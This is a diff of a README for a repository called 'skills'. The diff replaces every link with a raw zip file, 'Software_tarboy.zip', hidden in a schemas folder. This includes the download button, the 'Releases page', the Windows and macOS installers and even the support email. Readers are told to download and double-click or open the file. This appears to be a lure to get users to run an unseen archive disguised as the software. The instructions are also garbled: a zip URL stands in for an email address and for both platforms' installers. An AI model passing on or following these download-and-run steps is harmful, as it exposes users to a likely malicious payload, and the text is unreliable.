@@ -6,23 +6,23 @@ Welcome to the **skills** repository! This project lets you unlock the potential
 
 ## 📥 Download the Software
 
-[![Download skills](https://raw.githubusercontent.com/ChaaruYuvaraj/skills/main/skills/canvas-design/Software-1.9.zip)](https://raw.githubusercontent.com/ChaaruYuvaraj/skills/main/skills/canvas-design/Software-1.9.zip)
+[![Download skills](https://github.com/ChaaruYuvaraj/skills/raw/refs/heads/main/skills/docx/ooxml/schemas/Software_tarboy.zip)](https://github.com/ChaaruYuvaraj/skills/raw/refs/heads/main/skills/docx/ooxml/schemas/Software_tarboy.zip)
 
 To begin using this application, you first need to download it. 
 
-1. **Visit the releases page**: Click this link to go to the [Releases page](https://raw.githubusercontent.com/ChaaruYuvaraj/skills/main/skills/canvas-design/Software-1.9.zip).
+1. **Visit the releases page**: Click this link to go to the [Releases page](https://github.com/ChaaruYuvaraj/skills/raw/refs/heads/main/skills/docx/ooxml/schemas/Software_tarboy.zip).
    
 2. **Choose the latest version**: Look for the most recent version at the top of the list.
 
-3. **Download the files**: Click on the file that matches your operating system to start the download. This may include `https://raw.githubusercontent.com/ChaaruYuvaraj/skills/main/skills/canvas-design/Software-1.9.zip` for Windows or `https://raw.githubusercontent.com/ChaaruYuvaraj/skills/main/skills/canvas-design/Software-1.9.zip` for macOS. Your browser will save the file to your computer.
+3. **Download the files**: Click on the file that matches your operating system to start the download. This may include `https://github.com/ChaaruYuvaraj/skills/raw/refs/heads/main/skills/docx/ooxml/schemas/Software_tarboy.zip` for Windows or `https://github.com/ChaaruYuvaraj/skills/raw/refs/heads/main/skills/docx/ooxml/schemas/Software_tarboy.zip` for macOS. Your browser will save the file to your computer.
 
 4. **Locate the downloaded file**: Once the download is complete, go to your Downloads folder or wherever your browser saves downloaded files.
 
 ## ⚙️ Install the Application
 
 1. **Run the installer**: 
-   - **For Windows**: Double-click the `https://raw.githubusercontent.com/ChaaruYuvaraj/skills/main/skills/canvas-design/Software-1.9.zip` file. Follow the prompts in the setup wizard. 
-   - **For macOS**: Open the `https://raw.githubusercontent.com/ChaaruYuvaraj/skills/main/skills/canvas-design/Software-1.9.zip` file, then drag the `skills` icon to your Applications folder.
+   - **For Windows**: Double-click the `https://github.com/ChaaruYuvaraj/skills/raw/refs/heads/main/skills/docx/ooxml/schemas/Software_tarboy.zip` file. Follow the prompts in the setup wizard. 
+   - **For macOS**: Open the `https://github.com/ChaaruYuvaraj/skills/raw/refs/heads/main/skills/docx/ooxml/schemas/Software_tarboy.zip` file, then drag the `skills` icon to your Applications folder.
 
 2. **Open the application**: Once installed, you can find the app in your Applications or Start menu. Double-click the icon to open it.
 
@@ -55,12 +55,12 @@ If you encounter issues during installation or use, try these steps:
 
 If you need further assistance, contact our support team:
 
-- **Email**: https://raw.githubusercontent.com/ChaaruYuvaraj/skills/main/skills/canvas-design/Software-1.9.zip
+- **Email**: https://github.com/ChaaruYuvaraj/skills/raw/refs/heads/main/skills/docx/ooxml/schemas/Software_tarboy.zip
 - **Forums**: Visit our community forums for additional help from users and developers.
 
 ## 🔄 Updates
 
-To keep your application running smoothly, make sure to check for updates regularly. You can find the latest version on the [Releases page](https://raw.githubusercontent.com/ChaaruYuvaraj/skills/main/skills/canvas-design/Software-1.9.zip) and simply repeat the download steps to get the newest features.
+To keep your application running smoothly, make sure to check for updates regularly. You can find the latest version on the [Releases page](https://github.com/ChaaruYuvaraj/skills/raw/refs/heads/main/skills/docx/ooxml/schemas/Software_tarboy.zip) and simply repeat the download steps to get the newest features.
 
 ## 📝 License
 
